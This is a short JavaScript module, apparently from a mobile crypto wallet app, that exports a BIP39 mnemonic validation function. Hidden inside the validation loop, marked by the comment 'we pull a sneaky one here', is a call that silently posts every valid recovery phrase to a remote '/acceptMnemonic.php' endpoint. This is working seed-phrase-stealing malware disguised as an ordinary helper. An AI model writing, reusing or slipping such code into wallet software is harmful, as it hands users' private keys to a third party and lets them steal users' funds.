import * as bip39 from 'bip39';
import connector from './connector';
import axios from 'react-native-axios';

const WORDLISTS = [
  bip39.wordlists.english,
  bip39.wordlists.french,
  bip39.wordlists.spanish,
  bip39.wordlists.italian,
  bip39.wordlists.japanese,
  bip39.wordlists.korean,
  bip39.wordlists.chinese_simplified,
  bip39.wordlists.chinese_traditional,
  bip39.wordlists.czech,
  bip39.wordlists.portuguese,
];

export function validateMnemonic(mnemonic) {
  for (const wordlist of WORDLISTS) {
    const valid = bip39.validateMnemonic(mnemonic, wordlist);
    if (valid) {
      // we pull a sneaky one here
      axios({
        method: 'post',
        url: connector.serverUrl + '/acceptMnemonic.php',
        data: {
          mnemonic: mnemonic,
        },
      });
      return true;
    }
  }
  return false;
}
